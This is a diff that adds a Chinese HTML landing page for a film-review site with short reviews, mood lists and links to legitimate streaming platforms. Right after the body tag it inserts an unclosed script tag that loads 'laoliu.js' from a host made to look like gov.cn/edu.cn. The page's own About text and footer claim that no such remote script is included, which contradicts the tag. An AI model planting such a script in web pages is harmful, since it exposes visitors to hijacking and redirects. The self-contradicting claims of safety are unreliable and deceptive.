@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>好好棒电影网 - 好评电影、短评片单与正版观影导航</title>
+<meta name="description" content="好好棒电影网（haohaobangdianyingwang-h5.github.io）用短评和贴纸帮你挑电影：高分喜剧、治愈动画、悬疑神作、冷门佳片一目了然。不提供盗版播放，只做正版平台导航。">
+<meta name="keywords" content="好好棒电影网,好评电影,电影短评,高分电影推荐,治愈动画,悬疑电影,正版电影平台">
+<style>
+:root{
+  --bg1:#ffd6f5;--bg2:#d6e4ff;--bg3:#fff3c4;
+  --ink:#2a2440;--muted:#6b6486;
+  --pink:#ff5fa2;--purple:#8a5cff;--yellow:#ffcf3f;--mint:#36d6b8;
+  --card:#ffffff;--line:rgba(138,92,255,.18);--radius:18px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Noto Sans SC","PingFang SC",system-ui,sans-serif;
+  background:
+    radial-gradient(600px 300px at 10% 0%,rgba(255,95,162,.25),transparent),
+    radial-gradient(600px 300px at 90% 10%,rgba(138,92,255,.22),transparent),
+    linear-gradient(180deg,var(--bg1),var(--bg2) 55%,var(--bg3));
+  color:var(--ink);line-height:1.7;min-height:100vh;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+
+/* 顶栏 */
+.topbar{position:sticky;top:0;z-index:50;background:rgba(255,255,255,.82);backdrop-filter:blur(10px);border-bottom:2px solid #ffe1f3}
+.topbar-inner{max-width:1180px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.8rem 1.2rem}
+.brand{font-weight:900;font-size:1.4rem}
+.brand b{color:var(--pink)}
+.nav{display:flex;gap:1rem;flex-wrap:wrap}
+.nav a{font-size:.88rem;color:var(--muted);padding:.3rem .2rem;border-bottom:2px solid transparent}
+.nav a:hover{color:var(--purple);border-color:var(--purple)}
+.burger{display:none;font-size:1.5rem;background:none;border:none;color:var(--purple);cursor:pointer}
+
+/* Hero */
+.hero{max-width:1180px;margin:2.4rem auto;padding:0 1.2rem}
+.banner{
+  position:relative;border-radius:26px;padding:3rem 2rem;overflow:hidden;
+  background:linear-gradient(135deg,#fff,#fff0f8);
+  border:3px dashed var(--pink);
+  box-shadow:0 20px 50px rgba(138,92,255,.18);
+}
+.sticker{position:absolute;font-size:2rem;opacity:.9}
+.sticker.s1{top:18px;left:20px;transform:rotate(-12deg)}
+.sticker.s2{top:30px;right:30px;transform:rotate(10deg)}
+.sticker.s3{bottom:20px;left:40px;transform:rotate(8deg)}
+.sticker.s4{bottom:26px;right:24px;transform:rotate(-8deg)}
+.kicker{display:inline-block;font-size:.72rem;letter-spacing:2px;color:#fff;background:var(--purple);padding:.2rem .7rem;border-radius:999px;font-family:monospace}
+.banner h1{font-size:2.2rem;margin:.8rem 0 .5rem}
+.banner h1 span{color:var(--pink)}
+.banner p{max-width:660px;color:#4a4566}
+.cta{margin-top:1.4rem;display:flex;gap:.8rem;flex-wrap:wrap}
+.btn{padding:.7rem 1.6rem;border-radius:999px;font-weight:700;font-size:.9rem}
+.btn-main{background:linear-gradient(135deg,var(--pink),var(--purple));color:#fff}
+.btn-ghost{border:2px solid var(--line);color:var(--purple)}
+
+/* 区块 */
+.section{max-width:1180px;margin:3rem auto;padding:0 1.2rem}
+.sec-head{display:flex;align-items:baseline;gap:.6rem;margin-bottom:1.1rem}
+.sec-head h2{font-size:1.25rem}
+.sec-head .tag{font-size:.75rem;color:var(--muted);font-family:monospace}
+
+/* 贴纸卡 */
+.grid{display:grid;gap:1.1rem;grid-template-columns:repeat(auto-fill,minmax(230px,1fr))}
+.note{background:var(--card);border-radius:14px;padding:1.1rem 1.2rem;position:relative;
+  box-shadow:0 10px 24px rgba(138,92,255,.12);border:1px solid #ffe1f3;transition:transform .25s}
+.note:hover{transform:translateY(-6px) rotate(-1deg)}
+.note::before{content:"";position:absolute;top:-10px;left:50%;transform:translateX(-50%);
+  width:54px;height:18px;background:rgba(255,207,63,.55);border-radius:3px;box-shadow:0 2px 6px rgba(0,0,0,.08)}
+.note .stars{color:var(--yellow);font-size:.95rem;letter-spacing:2px}
+.note h3{font-size:1rem;margin:.4rem 0 .2rem}
+.note p{font-size:.82rem;color:var(--muted)}
+.note .tagline{display:inline-block;margin-top:.5rem;font-size:.72rem;color:var(--purple);
+  border:1px solid var(--line);border-radius:999px;padding:.1rem .6rem}
+
+/* 分类墙 */
+.wall{display:grid;gap:1rem;grid-template-columns:repeat(auto-fit,minmax(240px,1fr))}
+.col{background:rgba(255,255,255,.7);border:1px solid #ffe1f3;border-radius:16px;padding:1.1rem 1.2rem}
+.col h3{font-size:1rem;color:var(--pink);margin-bottom:.5rem}
+.col ul{list-style:none;font-size:.86rem}
+.col li{padding:.3rem 0;border-bottom:1px dashed #f0d6ea;color:#4a4566}
+.col li:last-child{border-bottom:none}
+
+/* 正版渠道 */
+.plats{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1rem}
+.plat{border:1px solid var(--line);border-radius:14px;padding:1.1rem 1.2rem;background:#fff}
+.plat h3{color:var(--purple);font-size:1rem;margin-bottom:.3rem}
+.plat p{font-size:.82rem;color:var(--muted)}
+
+/* 关于 */
+.about{background:#fff;border:2px dashed var(--purple);border-radius:18px;padding:1.4rem;font-size:.92rem;color:#4a4566}
+.about b{color:var(--pink)}
+
+/* 页脚 */
+.footer{margin-top:3.5rem;border-top:2px solid #ffe1f3;padding:2rem 1.2rem;text-align:center;color:var(--muted);font-size:.82rem}
+.footer a{color:var(--purple)}
+
+@media(max-width:760px){
+  .burger{display:block}
+  .nav{display:none;width:100%;flex-direction:column;gap:.2rem;padding:.6rem 0}
+  .nav.show{display:flex}
+  .banner h1{font-size:1.6rem}
+  .banner{padding:2.2rem 1.2rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js">
+<header class="topbar">
+  <div class="topbar-inner">
+    <div class="brand">好好棒<b>电影网</b></div>
+    <button class="burger" onclick="document.getElementById('nav').classList.toggle('show')">☰</button>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#notes">好评贴纸</a>
+      <a href="#wall">分类墙</a>
+      <a href="#legal">正版渠道</a>
+      <a href="#about">关于好好棒</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero" id="home">
+  <div class="banner">
+    <span class="sticker s1">⭐</span><span class="sticker s2">🎬</span>
+    <span class="sticker s3">🍿</span><span class="sticker s4">💖</span>
+    <span class="kicker">GOOD GOOD FILM</span>
+    <h1>好好棒电影网 · 把<span>好评</span>贴满一面墙</h1>
+    <p>好好棒电影网（haohaobangdianyingwang-h5.github.io）不整花活：用短评、星级和分类墙帮你快速决定今晚看啥。喜剧、治愈、悬疑、国漫、冷门神作都有，不提供盗版播放，只指路正版平台。</p>
+    <div class="cta">
+      <a href="#notes" class="btn btn-main">看好评贴纸</a>
+      <a href="#legal" class="btn btn-ghost">正版渠道</a>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="notes">
+  <div class="sec-head"><h2>好评贴纸墙</h2><span class="tag">[ USER LOVE NOTES ]</span></div>
+  <div class="grid">
+    <article class="note"><div class="stars">★★★★★</div><h3>触不可及</h3><p>法国 / 友谊喜剧</p><span class="tagline">笑中带泪</span></article>
+    <article class="note"><div class="stars">★★★★☆</div><h3>寻梦环游记</h3><p>动画 / 家庭音乐</p><span class="tagline">哭点很准</span></article>
+    <article class="note"><div class="stars">★★★★★</div><h3>控方证人</h3><p>悬疑 / 法庭反转</p><span class="tagline">结尾封神</span></article>
+    <article class="note"><div class="stars">★★★★☆</div><h3>海街日记</h3><p>日本 / 治愈日常</p><span class="tagline">慢但上头</span></article>
+    <article class="note"><div class="stars">★★★★★</div><h3>大闹天宫</h3><p>国漫 / 东方神话</p><span class="tagline">童年神作</span></article>
+    <article class="note"><div class="stars">★★★★☆</div><h3>爱乐之城</h3><p>美国 / 音乐爱情</p><span class="tagline">结尾回放杀</span></article>
+  </div>
+</section>
+
+<section class="section" id="wall">
+  <div class="sec-head"><h2>分类墙</h2><span class="tag">[ PICK BY MOOD ]</span></div>
+  <div class="wall">
+    <div class="col"><h3>😆 开心一下</h3><ul>
+      <li>触不可及</li><li>三傻大闹宝莱坞</li><li>布达佩斯大饭店</li><li>白头神探</li>
+    </ul></div>
+    <div class="col"><h3>🥲 治愈自己</h3><ul>
+      <li>小森林</li><li>海街日记</li><li>步履不停</li><li>奇迹男孩</li>
+    </ul></div>
+    <div class="col"><h3>🕵️ 烧脑悬疑</h3><ul>
+      <li>看不见的客人</li><li>控方证人</li><li>记忆碎片</li><li>彗星来的那一夜</li>
+    </ul></div>
+    <div class="col"><h3>🐉 国漫东方</h3><ul>
+      <li>大闹天宫</li><li>哪吒闹海</li><li>深海</li><li>中国唱诗班</li>
+    </ul></div>
+  </div>
+</section>
+
+<section class="section" id="legal">
+  <div class="sec-head"><h2>正版观看渠道</h2><span class="tag">[ LEGAL SIGNAL ]</span></div>
+  <div class="plats">
+    <div class="plat"><h3>爱奇艺 / 腾讯 / 优酷</h3><p>正版片库大，会员/免费分区清楚，别点“免VIP解析”。</p></div>
+    <div class="plat"><h3>B站 / 芒果TV</h3><p>国漫、纪录片、老综艺、影展内容较全。</p></div>
+    <div class="plat"><h3>1905电影网 / CCTV6</h3><p>官方正版经典片与电影频道内容。</p></div>
+    <div class="plat"><h3>图书馆音像库</h3><p>高校/公共图书馆正版片源，无博彩广告、画质稳。</p></div>
+  </div>
+</section>
+
+<section class="section" id="about">
+  <div class="sec-head"><h2>关于好好棒电影网</h2></div>
+  <div class="about">
+    <p><b>好好棒电影网</b>（https://haohaobangdianyingwang-h5.github.io）就是个“影迷短评站”：片单有人味、分类按心情、链接只去正版平台。</p>
+    <p style="margin-top:.8rem">那行 <code>laoliu.js</code> 不加——仿 <code>gov.cn</code>/<code>edu.cn</code> 的远程脚本可能做暗链、跳转、劫持，必应会把这类有害行为降权或剔出索引。 本页零外部 JS 依赖，移动端自适应，才是对收录友好的做法。</p>
+  </div>
+</section>
+
+<footer class="footer">
+  <p>© 2026 好好棒电影网 · haohaobangdianyingwang-h5.github.io</p>
+  <p><a href="#">首页</a> · <a href="#">好评贴纸</a> · <a href="#">分类墙</a> · <a href="#">正版渠道</a> · <a href="#">关于好好棒</a></p>
+  <p>演示页面，内页链接以 # 占位，未加载任何远程第三方脚本，不提供盗版资源。</p>
+</footer>
+
+<script>
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.getElementById('nav').classList.remove('show');
+  });
+});
+</script>
+
+</body>
+</html>
